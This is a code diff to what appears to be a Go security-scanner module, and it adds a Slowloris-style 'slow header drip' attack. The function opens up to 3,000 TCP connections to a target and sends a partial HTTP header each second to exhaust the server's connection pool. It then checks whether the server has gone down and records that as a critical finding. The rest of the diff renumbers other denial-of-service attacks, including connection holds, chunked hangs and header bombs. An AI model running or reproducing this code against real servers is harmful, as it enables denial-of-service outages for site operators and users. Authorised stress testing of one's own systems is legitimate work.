@@ -151,40 +151,47 @@ func (m *BreakageModule) runSequenceAttacks(ctx context.Context, addr, hostname 
 		}
 	}
 
-	// Attack 5: Massive connection hold (500 partial connections)
+	// Attack 5: Slow header drip (run early before other attacks consume resources)
+	if ctx.Err() == nil {
+		if f := m.attackSlowHeaderDrip(ctx, addr, hostname); f != nil {
+			findings = append(findings, *f)
+		}
+	}
+
+	// Attack 6: Massive connection hold (500 partial connections)
 	if ctx.Err() == nil {
 		if f := m.attackMassiveConnectionHold(ctx, addr, hostname); f != nil {
 			findings = append(findings, *f)
 		}
 	}
 
-	// Attack 6: Chunked hang flood (100 incomplete chunked requests)
+	// Attack 7: Chunked hang flood (100 incomplete chunked requests)
 	if ctx.Err() == nil {
 		if f := m.attackChunkedHangFlood(ctx, addr, hostname); f != nil {
 			findings = append(findings, *f)
 		}
 	}
 
-	// Attack 7: CL mismatch hang (large Content-Length, no body, at scale)
+	// Attack 8: CL mismatch hang (large Content-Length, no body, at scale)
 	if ctx.Err() == nil {
 		if f := m.attackCLMismatchHang(ctx, addr, hostname); f != nil {
 			findings = append(findings, *f)
 		}
 	}
 
-	// Attack 8: 500-triggering flood (rapid fire of payloads that cause 500s)
+	// Attack 9: 500-triggering flood (rapid fire of payloads that cause 500s)
 	if ctx.Err() == nil {
 		findings = append(findings, m.attack500Flood(ctx, addr, hostname)...)
 	}
 
-	// Attack 9: Combined simultaneous attack
+	// Attack 10: Combined simultaneous attack
 	if ctx.Err() == nil {
 		if f := m.attackCombinedAssault(ctx, addr, hostname); f != nil {
 			findings = append(findings, *f)
 		}
 	}
 
-	// Attack 10: Header bomb escalation
+	// Attack 11: Header bomb escalation
 	if ctx.Err() == nil {
 		findings = append(findings, m.attackHeaderBombEscalation(ctx, addr, hostname)...)
 	}
@@ -674,6 +681,91 @@ func (m *BreakageModule) attackHeaderBombEscalation(ctx context.Context, addr, h
 		}
 	}
 	return findings
+}
+
+// attackSlowHeaderDrip holds connections alive by slowly dripping headers,
+// preventing connection timeouts and exhausting the server's connection pool.
+// Each goroutine connects and immediately starts dripping to prevent the
+// server from timing out the connection. More effective than batch approaches
+// against event-driven servers like Nginx.
+func (m *BreakageModule) attackSlowHeaderDrip(ctx context.Context, addr, hostname string) *scanner.Finding {
+	for _, count := range []int{1000, 2000, 3000} {
+		if ctx.Err() != nil {
+			break
+		}
+
+		var (
+			conns []net.Conn
+			mu    sync.Mutex
+			wg    sync.WaitGroup
+			stop  = make(chan struct{})
+		)
+
+		// Each goroutine connects AND drips — interleaved, not batched.
+		// Stagger by 1ms per connection to gradually fill the pool.
+		for i := 0; i < count; i++ {
+			if ctx.Err() != nil {
+				break
+			}
+			wg.Add(1)
+			go func(idx int) {
+				defer wg.Done()
+				conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
+				if err != nil {
+					return
+				}
+				conn.SetDeadline(time.Now().Add(60 * time.Second))
+				fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nX-H: %d\r\n", hostname, idx)
+				mu.Lock()
+				conns = append(conns, conn)
+				mu.Unlock()
+
+				// Drip headers to keep connection alive
+				for j := 0; j < 30; j++ {
+					select {
+					case <-stop:
+						return
+					case <-time.After(1 * time.Second):
+					}
+					conn.SetDeadline(time.Now().Add(10 * time.Second))
+					if _, err := fmt.Fprintf(conn, "X-D-%d: v%d\r\n", j, j); err != nil {
+						return
+					}
+				}
+			}(i)
+			time.Sleep(1 * time.Millisecond) // 1ms stagger per connection
+		}
+
+		// Wait for connections to accumulate and overwhelm the server
+		time.Sleep(15 * time.Second)
+
+		alive := probeAlive(addr, 10*time.Second)
+
+		// Stop dripping and clean up
+		close(stop)
+		mu.Lock()
+		for _, c := range conns {
+			c.Close()
+		}
+		established := len(conns)
+		mu.Unlock()
+		wg.Wait()
+
+		if !alive {
+			time.Sleep(3 * time.Second)
+			return &scanner.Finding{
+				Category:    "breakage-exhaustion",
+				Severity:    "critical",
+				URL:         "tcp://" + addr,
+				Method:      "RAW",
+				Description: fmt.Sprintf("Server unresponsive under %d slow-drip connections (keeps sending headers to prevent timeout)", established),
+				Evidence:    fmt.Sprintf("%d connections slowly dripping headers caused complete server unavailability", established),
+			}
+		}
+
+		time.Sleep(3 * time.Second)
+	}
+	return nil
 }
 
 func executeBreakageAttack(ctx context.Context, addr string, atk breakageAttack, baseTimeout time.Duration) *scanner.Finding {
